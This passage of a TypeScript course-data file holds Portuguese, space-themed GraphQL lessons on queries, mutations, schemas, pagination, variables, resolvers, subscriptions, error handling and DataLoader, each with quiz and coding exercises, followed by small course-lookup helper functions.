dele:\n\n```graphql\nquery PerfilCompleto {\n  cadete(id: \"101\") {\n    nome\n    missoes {\n      titulo\n      recompensaXp\n    }\n  }\n}\n```\nTudo é resolvido e entregue em **uma única requisição HTTP**!\n\n> **💡 Dica Pro:**\n> Como o cliente sempre define o que quer receber, o backend pode adicionar novos campos no schema ao longo dos anos sem quebrar versões antigas de aplicativos móveis em circulação!\n\n> **⚠️ Armadilha Comum:**\n> Em GraphQL, as respostas de sucesso ou erro sempre retornam o código HTTP `200 OK`. Para verificar se houve falhas, o cliente inspeciona se o JSON contém a chave `errors`.",
        "codeExample": "# Exemplo de Query GraphQL com Variáveis\nquery BuscarNavePorCodigo($codigo: ID!) {\n  nave(codigo: $codigo) {\n    id\n    modelo\n    capacidade\n    status\n  }\n}",
        "exercises": [
          {
            "type": "quiz",
            "question": "O que é \"Over-fetching\" nas APIs REST tradicionais e como o GraphQL soluciona esse problema?",
            "options": [
              "É quando o servidor cai por excesso de tráfego; o GraphQL adiciona mais memória RAM ao servidor.",
              "É quando a API devolve muito mais campos e dados do que a interface realmente precisa; o GraphQL resolve permitindo que o cliente especifique os campos exatos.",
              "É quando o cliente faz uma requisição para a porta errada do roteador.",
              "É uma técnica avançada de compressão de imagens PNG."
            ],
            "correctIndex": 1,
            "explanation": "O GraphQL elimina o over-fetching porque o cliente descreve na query a forma exata dos dados que necessita, economizando banda de rede e processamento móvel."
          },
          {
            "type": "fillblank",
            "title": "Estruturando a Query de Tripulantes",
            "instruction": "Complete a palavra-chave padrão de leitura do GraphQL.",
            "codeSnippet": "{{tipo_operacao}} ListarOficiais {\n  oficiais {\n    id\n    nome\n  }\n}",
            "blanks": [
              {
                "id": "tipo_operacao",
                "placeholder": "tipo de operação",
                "expectedValues": [
                  "query"
                ],
                "hint": "Palavra em inglês usada para operações de busca e leitura no GraphQL."
              }
            ],
            "explanation": "Perfeito! query é o tipo raiz do GraphQL para operações de consulta seguras e sem efeito colateral."
          }
        ]
      },
      {
        "id": "graphql-2",
        "title": "2. Modificando o Cosmos: Mutations & Schemas Tipados",
        "description": "Crie e altere dados com Mutations atômicas e aprenda o Schema Definition Language (SDL).",
        "duration": 16,
        "xpReward": 65,
        "language": "graphql",
        "content": "# ⚡ Mutations & Schemas Tipados no GraphQL\n\nSe as **Queries** são usadas para buscar dados (equivalente ao `GET` do REST), como fazemos para criar, alterar ou deletar registros?\n\nNo GraphQL, todas as operações que causam alterações ou efeitos colaterais no servidor são chamadas de **Mutations**!\n\n---\n\n### ✍️ A Anatomia de uma Mutation\n\nUma `mutation` recebe parâmetros e já permite solicitar os dados resultantes na mesma requisição:\n\n```graphql\nmutation CriarNovoCadete($nome: String!, $nivelInicial: Int!) {\n  cadastrarCadete(nome: $nome, nivel: $nivelInicial) {\n    id\n    nome\n    criadoEm\n  }\n}\n```\n\n---\n\n### 📜 Schema Definition Language (SDL)\n\nToda API GraphQL possui um contrato rígido chamado **Schema**. Nele definimos os tipos:\n\n```graphql\ntype Cadete {\n  id: ID!\n  nome: String!\n  nivel: Int!\n  ativo: Boolean\n}\n\ntype Query {\n  obterCadete(id: ID!): Cadete\n}\n\ntype Mutation {\n  cadastrarCadete(nome: String!, nivel: Int!): Cadete\n}\n```\n\n### ❗ O Modificador `!` (Non-Null / Obrigatório)\n\n- `String`: Pode retornar um texto OU o valor `null`.\n- `String!`: É **estritamente obrigatório**. O servidor garante que nunca será retornado `null`.\n\n> **💡 Dica Pro:**\n> O tipo escalar nativo `ID` sinaliza para ferramentas e clientes como Apollo Client ou Relay que aquele campo é uma chave única ideal para normalização e atualização automática de cache na tela!\n\n> **⚠️ Armadilha Comum:**\n> Esquecer de declarar as variáveis na assinatura da mutation (ex: esquecer `$nome: String!`) gera erro de validação de sintaxe antes da execução.",
        "codeExample": "# Schema Completo de Missões da Frota\ntype Missao {\n  id: ID!\n  titulo: String!\n  recompensaXp: Int!\n  concluida: Boolean!\n}\n\ntype Mutation {\n  concluirMissao(missaoId: ID!): Missao!\n}",
        "exercises": [
          {
            "type": "quiz",
            "question": "No Schema Definition Language (SDL) do GraphQL, o que significa o ponto de exclamação (!) após o nome de um tipo (ex: String! ou ID!)?",
            "options": [
              "Indica que o campo contém dados altamente confidenciais.",
              "Indica que o campo é obrigatório (Non-Null) e nunca poderá ter valor nulo.",
              "Indica que o campo só aceita letras maiúsculas.",
              "Indica que o campo será excluído na próxima versão da API."
            ],
            "correctIndex": 1,
            "explanation": "O ponto de exclamação marca o tipo como Non-Null (não-nulo), exigindo que os clientes forneçam o dado ou garantindo que o servidor sempre o devolverá preenchido."
          },
          {
            "type": "code",
            "instruction": "Escreva uma mutation GraphQL chamada ConcluirTreinamento que recebe a variável $id: ID! e invoca concluir(id: $id) solicitando de volta os campos id e status.",
            "initialCode": "# Escreva a mutation abaixo\n",
            "expectedKeywords": [
              "mutation ConcluirTreinamento($id: ID!)",
              "concluir(id: $id)",
              "id",
              "status"
            ],
            "hint": "Escreva: mutation ConcluirTreinamento($id: ID!) { concluir(id: $id) { id status } }.",
            "solution": "mutation ConcluirTreinamento($id: ID!) {\n  concluir(id: $id) {\n    id\n    status\n  }\n}"
          }
        ]
      },
      {
        "id": "graphql-3",
        "title": "3. Argumentos, Filtros e Paginação em Consultas",
        "description": "Consulte dados com argumentos precisos, filtros dinâmicos e paginação por limites e cursores em GraphQL.",
        "duration": 16,
        "xpReward": 65,
        "language": "graphql",
        "content": "# 🔍 Argumentos, Filtros e Paginação em Consultas\n\nConectividade quântica na Matriz Conectiva! Em APIs REST antigas, filtrar por status ou paginar resultados exigia dezenas de parâmetros de query string confusos (`/api/planetas?status=ativo&limit=10&page=2`). No GraphQL, **cada campo pode receber seus próprios argumentos tipados**.\n\n> **💡 Argumentos em Campos GraphQL**\n> Em GraphQL, argumentos não se limitam à raiz da consulta; você pode passar argumentos específicos para campos aninhados em qualquer profundidade da árvore de dados!\n\n---\n\n### 🎯 Consultas com Argumentos e Filtros\n\n```graphql\nquery BuscarNavesOperacionais {\n  planeta(id: \"terra-digital\") {\n    nome\n    # O campo naves recebe filtros específicos!\n    naves(status: ATIVO, limitePotenciaMinima: 500) {\n      modelo\n      velocidadeMax\n      tripulantes(cargo: COMANDANTE) {\n        nome\n      }\n    }\n  }\n}\n```\n\n---\n\n### 📄 Paginação de Dados: Limite/Deslocamento vs Cursores\n\n1. **Paginação por Offset (Simples):**\n```graphql\nquery ListarMissoesOffset {\n  missoes(limit: 5, offset: 10) {\n    id\n    titulo\n  }\n}\n```\n\n2. **Paginação por Cursor (Padrão de Alta Escala do Relay):**\nPara feeds em tempo real que não perdem itens quando novos registros são inseridos:\n```graphql\nquery ListarFeedCursor {\n  relatorios(first: 10, after: \"cursor_registro_42\") {\n    edges {\n      cursor\n      node {\n        id\n        conteudo\n      }\n    }\n    pageInfo {\n      hasNextPage\n      endCursor\n    }\n  }\n}\n```\n\n> **⚠️ Armadilha Comum:**\n> Passar argumentos com valores literais soltos no código do frontend (como `id: \"42\"`). Em clientes reais, consultas devem usar **Variáveis do GraphQL** (`$id: ID!`) para permitir cache otimizado pelo Apollo Client ou Relay!\n\n---\n\n### 🛡️ Boas Práticas da Frota Estelar\n\n- Defina valores padrão razoáveis para argumentos no schema (ex: `limit: Int = 20`) para proteger seu banco de dados contra consultas acidentais de milhões de linhas.\n- Use enums para restringir argumentos a um conjunto seguro de opções (ex: `status: StatusNave`).\n\n> **🛡️ Regra de Ouro:**\n> O cliente solicita exatamente o que precisa com filtros cirúrgicos, minimizando tráfego de rede e consumo de bateria.",
        "codeExample": "query ObterCadete($id: ID!) {\n  cadete(id: $id) {\n    nome\n    conquistas(limit: 3) {\n      titulo\n      xp\n    }\n  }\n}",
        "exercises": [
          {
            "type": "quiz",
            "question": "Qual é uma vantagem do modelo de paginação baseada em cursores (Cursor-based Pagination) em relação ao modelo clássico de limit/offset em GraphQL?",
            "options": [
              "A paginação por cursor converte dados para XML automaticamente.",
              "Ela evita o problema de pular ou duplicar itens quando novos registros são inseridos enquanto o usuário navega pelo feed.",
              "Ela elimina a necessidade de banco de dados.",
              "Ela só funciona para consultas feitas em servidores Linux."
            ],
            "correctIndex": 1,
            "explanation": "Cursores apontam para nós de dados específicos e imutáveis, garantindo que novas inserções não desloquem os índices e não gerem duplicidade no feed."
          },
          {
            "type": "code",
            "instruction": "Escreva uma consulta GraphQL que busque \"cadetes\" passando o argumento \"ativo: true\" e solicitando apenas o campo \"nome\".",
            "initialCode": "# Escreva a query GraphQL aqui\n",
            "expectedKeywords": [
              "cadetes(ativo: true)",
              "{",
              "nome",
              "}"
            ],
            "hint": "Use:\nquery {\n  cadetes(ativo: true) {\n    nome\n  }\n}",
            "solution": "query {\n  cadetes(ativo: true) {\n    nome\n  }\n}"
          }
        ]
      },
      {
        "id": "graphql-4",
        "title": "4. Variáveis Dinâmicas e Operações Nomeadas",
        "description": "Elimine concatenação perigosa de strings usando variáveis fortemente tipadas ($id: ID!) e nomes de operações.",
        "duration": 15,
        "xpReward": 65,
        "language": "graphql",
        "content": "# ⚡ Variáveis Dinâmicas e Operações Nomeadas\n\nBoas práticas na Matriz Conectiva! No desenvolvimento de aplicações profissionais com React, Vue ou mobile, nunca montamos consultas GraphQL concatenando strings manuais (`\"query { cadete(id: \" + id + \") }\"`). Essa prática quebra o cache e abre brechas de segurança. Usamos **Variáveis GraphQL**.\n\n> **💡 O que são Variáveis em GraphQL?**\n> São parâmetros dinâmicos declarados no cabeçalho da operação com o prefixo `$`. A consulta torna-se estática e imutável, e os valores dos parâmetros são transmitidos separadamente em um objeto JSON dedicado.\n\n---\n\n### 🧩 A Anatomia de uma Consulta com Variáveis\n\n```graphql\n# 1. Nome da Operação + Declaração das Variáveis Tipadas:\nquery BuscarCadetePorFiltro($cadeteId: ID!, $incluirMissoes: Boolean = false) {\n  # 2. Passagem da variável para o campo:\n  cadete(id: $cadeteId) {\n    nome\n    patente\n    # 3. Diretiva condicional nativa controlada pela variável:\n    missoes @include(if: $incluirMissoes) {\n      titulo\n      recompensaXp\n    }\n  }\n}\n```\n\nObjeto JSON de variáveis enviado em paralelo:\n```json\n{\n  \"cadeteId\": \"NX-702\",\n  \"incluirMissoes\": true\n}\n```\n\n---\n\n### 🛡️ O Ponto de Exclamação: `ID!` vs `ID`\n\n- **`ID!`**: O ponto de exclamação indica que a variável é **estritamente obrigatória** (*Non-Null*). Se o cliente disparar a consulta sem fornecer o valor, a validação do GraphQL aborta a chamada antes mesmo de bater no banco de dados!\n- **`ID`**: Opcional (pode ser `null`).\n\n> **⚠️ Armadilha Comum:**\n> Deixar consultas anônimas sem nome (apenas `{ cadete { nome } }`). Sempre atribua um nome descritivo à sua operação (`query ObterPerfilCadete { ... }`). Sem o nome, bibliotecas como Apollo Client não conseguem indexar o cache de requisições e ferramentas de monitoramento não conseguem gerar métricas!\n\n---\n\n### 🛡️ Boas Práticas da Frota Estelar\n\n- Use a diretiva `@include(if: $condicao)` ou `@skip(if: $condicao)` para controlar dinamicamente a presença de campos na resposta.\n- Nomeie suas operações de forma única e semântica em todo o projeto do frontend.\n\n> **🛡️ Regra de Ouro:**\n> Consultas estáticas com variáveis dinâmicas permitem que o cliente compile e valide as queries em tempo de build, atingindo performance estelar.",
        "codeExample": "query ObterNave($codigo: String!) {\n  nave(codigo: $codigo) {\n    id\n    modelo\n    status\n  }\n}",
        "exercises": [
          {
            "type": "quiz",
            "question": "Em GraphQL, o que significa o ponto de exclamação ao final da declaração do tipo de uma variável, como em \"$id: ID!\"?",
            "options": [
              "Que a variável deve ser impressa em letras maiúsculas.",
              "Que a variável é de preenchimento obrigatório (não-nula / non-null) para que a operação seja executada.",
              "Que a variável deve conter números negativos.",
              "Que o valor será criptografado com chave militar."
            ],
            "correctIndex": 1,
            "explanation": "O modificador ! marca o tipo como Non-Null, impedindo a passagem de valores nulos e garantindo a presença do parâmetro."
          },
          {
            "type": "code",
            "instruction": "Declare o cabeçalho de uma query nomeada \"GetPlaneta\" que receba a variável obrigatória \"$slug\" do tipo \"String!\".",
            "initialCode": "# Escreva o cabeçalho da query aqui\n",
            "expectedKeywords": [
              "query GetPlaneta($slug: String!) {"
            ],
            "hint": "Use: query GetPlaneta($slug: String!) {\n}",
            "solution": "query GetPlaneta($slug: String!) {\n}"
          }
        ]
      },
      {
        "id": "graphql-5",
        "title": "5. Construindo Resolvers e Lógica de Negócio",
        "description": "Dê vida ao Schema implementando funções resolver com (parent, args, context, info) no backend.",
        "duration": 17,
        "xpReward": 65,
        "language": "graphql",
        "content": "# 🧠 Construindo Resolvers e Lógica de Negócio\n\nMotor de execução da Matriz Conectiva! O Schema do GraphQL é apenas o esqueleto e o contrato. Quem realmente busca os dados no banco de dados e calcula a lógica de negócios são as funções **Resolver**.\n\n> **💡 O que é uma Função Resolver?**\n> Um resolver é uma função responsável por buscar e retornar o dado associado a um determinado campo do schema. Cada campo em uma consulta GraphQL é mapeado diretamente para uma função resolver no backend!\n\n---\n\n### ⚙️ Os 4 Argumentos Mestres de um Resolver\n\nEm servidores como Apollo Server ou Yoga, toda função resolver recebe a mesma assinatura de 4 parâmetros:\n\n```javascript\nconst resolvers = {\n  Query: {\n    cadete: async (parent, args, context, info) => {\n      // 1. parent: resultado retornado pelo resolver pai (se houver)\n      // 2. args: argumentos passados na query (ex: args.id)\n      // 3. context: dados globais compartilhados (usuário logado, banco de dados)\n      // 4. info: árvore de campos selecionados pelo cliente\n\n      const { id } = args;\n      const { banco, usuarioAutenticado } = context;\n\n      if (!usuarioAutenticado) {\n        throw new Error('Acesso negado: não autenticado na frota.');\n      }\n\n      return await banco.buscarCadetePorId(id);\n    }\n  },\n\n  // Resolvendo campos aninhados:\n  Cadete: {\n    // Aqui, parent é o próprio objeto Cadete resolvido na Query acima!\n    planetaOrigem: async (parent, args, context) => {\n      return await context.banco.buscarPlanetaPorId(parent.planetaId);\n    }\n  }\n};\n```\n\n---\n\n### 🌐 O Objeto `context`: O Coração da Aplicação\n\nO `context` é construído uma única vez a cada requisição HTTP recebida. É nele que você valida o cabeçalho `Authorization: Bearer <token>` e injeta instâncias do banco de dados para que todos os resolvers tenham acesso seguro aos serviços da base!\n\n> **⚠️ Armadilha Comum:**\n> Fazer consultas pesadas ao banco no resolver sem aproveitar os dados que já vieram no `parent`. Se o resolver pai já carregou o dado completo, simplesmente devolva `parent.campo` sem bater no banco de novo!\n\n---\n\n### 🛡️ Boas Práticas da Frota Estelar\n\n- Mantenha os resolvers magros (*Thin Resolvers*): delegue a lógica pesada de negócios e SQL para camadas dedicadas de serviços (*Services* ou *Repositories*).\n- Isole a validação de autenticação e autorização no início do resolver ou utilize middlewares de schema (*Shield*).\n\n> **🛡️ Regra de Ouro:**\n> O GraphQL orquestra a resolução do grafo de dados: cada resolver resolve apenas a sua fatia de responsabilidade.",
        "codeExample": "const resolvers = {\n  Query: {\n    todasNaves: async (_, __, { db }) => {\n      return await db.naves.findMany();\n    }\n  }\n};",
        "exercises": [
          {
            "type": "quiz",
            "question": "Em uma função resolver do GraphQL com assinatura (parent, args, context, info), qual parâmetro armazena dados da sessão do usuário autenticado e conexões compartilhadas com o banco de dados?",
            "options": [
              "parent",
              "args",
              "context",
              "info"
            ],
            "correctIndex": 2,
            "explanation": "O objeto context é criado por requisição e serve para disponibilizar dependências compartilhadas, como autenticação e conexões de banco."
          },
          {
            "type": "code",
            "instruction": "Escreva a assinatura básica de uma função resolver assíncrona chamada \"meuResolver\" recebendo os 4 parâmetros padrão: parent, args, context, info.",
            "initialCode": "// Escreva a função assíncrona aqui\n",
            "expectedKeywords": [
              "async function meuResolver(parent, args, context, info) {"
            ],
            "hint": "Use: async function meuResolver(parent, args, context, info) {\n}",
            "solution": "async function meuResolver(parent, args, context, info) {\n}"
          }
        ]
      },
      {
        "id": "graphql-6",
        "title": "6. Tempo Real com Subscriptions e WebSockets",
        "description": "Transmita eventos ao vivo na frota com a operação Subscription do GraphQL e canais PubSub sobre WebSockets.",
        "duration": 17,
        "xpReward": 65,
        "language": "graphql",
        "content": "# 📡 Tempo Real com Subscriptions e WebSockets\n\nTransmissões ao vivo na Matriz Conectiva! Além de buscar dados com `Query` e alterar dados com `Mutation`, o GraphQL possui uma terceira operação fundamental: a **Subscription**.\n\n> **💡 O que é uma Subscription?**\n> Uma Subscription estabelece uma conexão bidirecional contínua de longa duração (geralmente via protocolo **WebSocket**). O cliente se inscreve em um evento, e sempre que algo relevante acontece no servidor, uma atualização com a carga de dados solicitada é enviada instantaneamente para a tela do usuário!\n\n---\n\n### 🛰️ Definindo a Subscription no Schema\n\n```graphql\ntype Subscription {\n  # O cliente recebe dados da nave toda vez que as coordenadas mudam!\n  naveAtualizada(naveId: ID!): Nave!\n  \n  # Alerta global transmitido para toda a frota\n  novoAlertaEspacial: Alerta!\n}\n```\n\n---\n\n### 📻 Publicando Eventos com PubSub no Servidor\n\n```javascript\nconst { PubSub } = require('graphql-subscriptions');\nconst pubsub = new PubSub();\n\nconst CANAL_ALERTAS = 'NOVO_ALERTA';\n\nconst resolvers = {\n  Mutation: {\n    dispararAlerta: async (_, { mensagem, severidade }) => {\n      const alerta = { mensagem, severidade, data: new Date().toISOString() };\n      \n      // 1. Publica o evento no canal PubSub:\n      pubsub.publish(CANAL_ALERTAS, { novoAlertaEspacial: alerta });\n      \n      return alerta;\n    }\n  },\n\n  Subscription: {\n    novoAlertaEspacial: {\n      // 2. Ouve o canal e transmite para os clientes inscritos:\n      subscribe: () => pubsub.asyncIterator([CANAL_ALERTAS])\n    }\n  }\n};\n```\n\n---\n\n### 📱 Inscrição no Frontend\n\nO cliente solicita apenas os campos necessários, exatamente como em uma query:\n\n```graphql\nsubscription OuvirAlarmes {\n  novoAlertaEspacial {\n    mensagem\n    severidade\n  }\n}\n```\n\n> **⚠️ Armadilha Comum:**\n> Usar Subscriptions para dados que não precisam de tempo real crítico (como a contagem de visitas de um blog estático). WebSockets consomem conexões abertas contínuas e memória no servidor. Se o dado pode esperar 30 segundos, use polling periódico tradicional!\n\n---\n\n### 🛡️ Boas Práticas da Frota Estelar\n\n- Autentique o cliente no momento do aperto de mão (*handshake*) inicial da conexão WebSocket passando o token JWT em `connectionParams`.\n- Em clusters de múltiplos servidores, utilize um adaptador distribuído como `RedisPubSub` para que mensagens publicadas em um servidor cheguem a clientes conectados em outros servidores.\n\n> **🛡️ Regra de Ouro:**\n> Subscriptions mantêm os radares da frota em sintonia imediata com a realidade do cosmos.",
        "codeExample": "subscription MonitorarMissao($id: ID!) {\n  missaoProgresso(id: $id) {\n    status\n    porcentagemConcluida\n  }\n}",
        "exercises": [
          {
            "type": "quiz",
            "question": "Qual protocolo de rede é utilizado como padrão pela maioria das implementações de GraphQL para manter conexões contínuas e bidirecionais de Subscriptions?",
            "options": [
              "FTP",
              "WebSockets (ws:// ou wss://)",
              "SMTP",
              "SSH"
            ],
            "correctIndex": 1,
            "explanation": "O protocolo WebSockets estabelece conexões persistentes full-duplex sobre uma única conexão TCP, ideais para o streaming de eventos das Subscriptions."
          },
          {
            "type": "code",
            "instruction": "Escreva a declaração de uma operação de assinatura do GraphQL chamada \"subscription OnStatusChange\" solicitando o campo \"status\".",
            "initialCode": "# Escreva a subscription aqui\n",
            "expectedKeywords": [
              "subscription OnStatusChange {",
              "status",
              "}"
            ],
            "hint": "Use:\nsubscription OnStatusChange {\n  status\n}",
            "solution": "subscription OnStatusChange {\n  status\n}"
          }
        ]
      },
      {
        "id": "graphql-7",
        "title": "7. Tratamento Centralizado de Erros e Tipos de União",
        "description": "Gerencie respostas com falha de forma elegante usando o array errors do GraphQL e Union Types expressivos.",
        "duration": 16,
        "xpReward": 65,
        "language": "graphql",
        "content": "# 🚨 Tratamento Centralizado de Erros e Tipos de União\n\nResiliência na Matriz Conectiva! Em APIs REST, um erro em uma parte da tela (como um widget secundário de clima que falhou) costuma derrubar a requisição inteira com código HTTP 500. No GraphQL, temos **resolução parcial de erros** e **Union Types**.\n\n> **💡 Resoluções Parciais em GraphQL**\n> A resposta do GraphQL pode conter **`data` E `errors` ao mesmo tempo**! Se um dos campos falhar, o servidor preenche aquele campo com `null`, insere o detalhe do erro no array `errors`, mas entrega todo o restante dos dados saudáveis da tela intactos!\n\n---\n\n### 📦 A Estrutura de Resposta Padrão\n\n```json\n{\n  \"data\": {\n    \"cadete\": { \"nome\": \"Alex\" },\n    \"saldoBanco\": null\n  },\n  \"errors\": [\n    {\n      \"message\": \"Serviço financeiro temporariamente em manutenção.\",\n      \"locations\": [{ \"line\": 4, \"column\": 5 }],\n      \"path\": [\"saldoBanco\"],\n      \"extensions\": {\n        \"code\": \"SERVICO_INDISPONIVEL\",\n        \"statusCode\": 503\n      }\n    }\n  ]\n}\n```\n\n---\n\n### 🧬 O Padrão de Erro Tipado com Union Types\n\nMuitos arquitetos seniores preferem modelar erros de negócios diretamente no schema como tipos de união:\n\n```graphql\n# 1. Definindo o sucesso e possíveis erros de negócio\ntype SucessoEmbarque {\n  nave: Nave!\n}\n\ntype CabineLotadaErro {\n  mensagem: String!\n  vagasDisponiveis: Int!\n}\n\ntype CredenciaisInvalidasErro {\n  mensagem: String!\n}\n\n# 2. O retorno é uma UNIÃO dos tipos possíveis:\nunion ResultadoEmbarque = SucessoEmbarque | CabineLotadaErro | CredenciaisInvalidasErro\n\ntype Mutation {\n  embarcarCadete(cadeteId: ID!, naveId: ID!): ResultadoEmbarque!\n}\n```\n\nNo frontend, você trata os cenários com fragmentos tipados (`... on CabineLotadaErro`):\n\n```graphql\nmutation FazerEmbarque {\n  embarcarCadete(cadeteId: \"1\", naveId: \"9\") {\n    ... on SucessoEmbarque {\n      nave { modelo }\n    }\n    ... on CabineLotadaErro {\n      mensagem\n      vagasDisponiveis\n    }\n  }\n}\n```\n\n> **⚠️ Armadilha Comum:**\n> Expor erros com stack traces do banco de dados em produção! Utilize o formatador de erros do servidor para mascarar exceções internas e exibir apenas códigos semânticos amigáveis para clientes externos.\n\n---\n\n### 🛡️ Boas Práticas da Frota Estelar\n\n- Use a propriedade `extensions.code` nos erros do GraphQL para que o frontend tome decisões lógicas baseadas em códigos estáveis (ex: `UNAUTHENTICATED`) e não em textos livres.\n- Reserve exceções e o array `errors` para falhas inesperadas de infraestrutura, e prefira Union Types para regras esperadas de negócio.\n\n> **🛡️ Regra de Ouro:**\n> Falhas em subsistemas isolados nunca devem derrubar a estação inteira.",
        "codeExample": "// Lançando erro semântico no Apollo Server\nthrow new GraphQLError('Cadete não localizado no banco de dados', {\n  extensions: { code: 'NOT_FOUND', http: { status: 404 } }\n});",
        "exercises": [
          {
            "type": "quiz",
            "question": "Em GraphQL, o que acontece quando um campo secundário de uma consulta falha ao buscar dados no banco de dados, mas os outros campos obtiveram sucesso?",
            "options": [
              "O servidor fecha a conexão TCP imediatamente sem enviar resposta.",
              "O servidor retorna o payload com os campos bem-sucedidos em \"data\" e detalha a falha do campo específico no array \"errors\".",
              "O GraphQL substitui todo o banco de dados por um backup.",
              "O cliente é forçado a reiniciar o navegador."
            ],
            "correctIndex": 1,
            "explanation": "O GraphQL suporta tolerância a falhas com respostas parciais: o campo problemático recebe null e o erro é reportado em errors, mantendo os dados saudáveis em data."
          },
          {
            "type": "code",
            "instruction": "Escreva a declaração de um tipo union em GraphQL chamado \"ResultadoBusca\" que possa ser \"Cadete\" OU \"ErroBusca\".",
            "initialCode": "# Declare a union ResultadoBusca aqui\n",
            "expectedKeywords": [
              "union ResultadoBusca = Cadete | ErroBusca"
            ],
            "hint": "Use: union ResultadoBusca = Cadete | ErroBusca",
            "solution": "union ResultadoBusca = Cadete | ErroBusca"
          }
        ]
      },
      {
        "id": "graphql-8",
        "title": "8. Resolvendo o Problema N+1 com DataLoader",
        "description": "Otimize a performance quântica da API eliminando enxurradas de queries repetitivas com o padrão Batching do DataLoader.",
        "duration": 17,
        "xpReward": 70,
        "language": "graphql",
        "content": "# ⚡ Resolvendo o Problema N+1 com DataLoader\n\nMissão final na Matriz Conectiva! O poder do GraphQL de solicitar campos aninhados livremente traz consigo um desafio arquitetural clássico de performance: o **Problema das Consultas N+1** (*N+1 Query Problem*).\n\n> **💡 O que é o Problema N+1?**\n> Se você busca 50 cadetes e para cada cadete você resolve seu planeta de origem, um backend ingênuo disparará:\n> - **1 consulta** para buscar os 50 cadetes: `SELECT * FROM cadetes`\n> - **50 consultas adicionais** individuais para buscar o planeta de cada um: `SELECT * FROM planetas WHERE id = ?`!\n> Em uma única requisição, o servidor bombardeou o banco de dados com 51 consultas consecutivas!\n\n---\n\n### 🛡️ O Salvador da Pátria: Facebook DataLoader\n\nO **DataLoader** é um utilitário simples e genial que resolve o problema utilizando dois conceitos:\n1. **Batching (Agrupamento em Lote):** Ele coleta todas as chaves solicitadas durante o mesmo tique do Event Loop e as funde em uma única consulta SQL consolidada com `WHERE id IN (?, ?, ?)`!\n2. **Caching (Cache por Requisição):** Se múltiplos cadetes pertencem ao mesmo planeta (`id: 1`), o DataLoader busca o planeta apenas uma vez e entrega o resultado em cache para todos os outros!\n\n---\n\n### ⚙️ Implementando o DataLoader na Prática\n\n```javascript\nconst DataLoader = require('dataloader');\n\n// Função de carregamento em lote (Batch Function)\nasync function carregarPlanetasEmLote(planetaIds) {\n  // planetaIds é uma lista de IDs: [1, 2, 1, 3...]\n  console.log('Executando UMA ÚNICA consulta SQL consolidada para IDs:', planetaIds);\n  \n  const planetas = await db.query(\n    'SELECT * FROM planetas WHERE id IN ($1)', \n    [planetaIds]\n  );\n\n  // IMPORTANTE: O array retornado DEVE ter o mesmo tamanho e a mesma ordem dos IDs recebidos!\n  return planetaIds.map(id => planetas.find(p => p.id === id));\n}\n\n// Instanciado NOVO a cada requisição dentro do context:\nconst planetaLoader = new DataLoader(carregarPlanetasEmLote);\n```\n\nNo seu Resolver:\n```javascript\nconst resolvers = {\n  Cadete: {\n    planetaOrigem: (cadete, _, { loaders }) => {\n      // O DataLoader adia a execução e agrupa todas as chamadas automaticamente!\n      return loaders.planetaLoader.load(cadete.planetaId);\n    }\n  }\n};\n```\n\nDe 51 consultas para apenas **2 consultas** no banco!\n\n> **⚠️ Armadilha Comum:**\n> Criar uma instância global única do DataLoader compartilhada por múltiplos usuários. O cache do DataLoader deve ser **por requisição** (*per-request*). Se for global, um usuário poderá ver em cache dados confidenciais do usuário anterior!\n\n---\n\n### 🛡️ Boas Práticas da Frota Estelar\n\n- Instancie seus DataLoaders dentro da função de criação do `context` a cada nova requisição HTTP.\n- Garanta que a função em lote preserve rigorosamente a ordem e a correspondência nula dos registros.\n\n> **🛡️ Regra de Ouro:**\n> Qualquer relação aninhada 1-para-N ou N-para-1 em um schema GraphQL deve ser resolvida através de DataLoaders.",
        "codeExample": "// Uso idiomático no resolver\nconst planeta = await context.loaders.planetaLoader.load(parent.planetaId);",
        "exercises": [
          {
            "type": "quiz",
            "question": "Qual é o mecanismo central que o DataLoader utiliza para eliminar o problema N+1 em APIs GraphQL?",
            "options": [
              "Ele deleta registros duplicados do disco rígido.",
              "Ele intercepta chamadas individuais no mesmo frame de execução do event loop e as agrupa (batching) em uma única consulta consolidada com cláusula IN.",
              "Ele converte consultas GraphQL em chamadas REST.",
              "Ele força o uso de banco de dados NoSQL."
            ],
            "correctIndex": 1,
            "explanation": "O DataLoader faz o agrupamento (batching) de múltiplas solicitações de IDs em uma única consulta em lote, além de cachear os nós dentro do escopo daquela requisição."
          },
          {
            "type": "code",
            "instruction": "Escreva a linha de código no resolver chamando o método \"load\" de \"context.loaders.naveLoader\" passando o \"parent.naveId\".",
            "initialCode": "// Chame o loader aqui com return\n",
            "expectedKeywords": [
              "return context.loaders.naveLoader.load(parent.naveId);"
            ],
            "hint": "Use: return context.loaders.naveLoader.load(parent.naveId);",
            "solution": "return context.loaders.naveLoader.load(parent.naveId);"
          }
        ]
      }
    ]
  }
];

export function getCourseBySlug(slug: string) {
  return COURSES.find((c) => c.slug === slug);
}

export function getLessonById(courseSlug: string, lessonId: string) {
  const course = getCourseBySlug(courseSlug);
  if (!course) return null;
  const lesson = course.lessons.find((l) => l.id === lessonId);
  if (!lesson) return null;
  return { course, lesson };
}

export function getAllCourses() {
  return COURSES.map((course) => ({
    ...course,
    totalLessons: course.lessons.length,
  }));
}
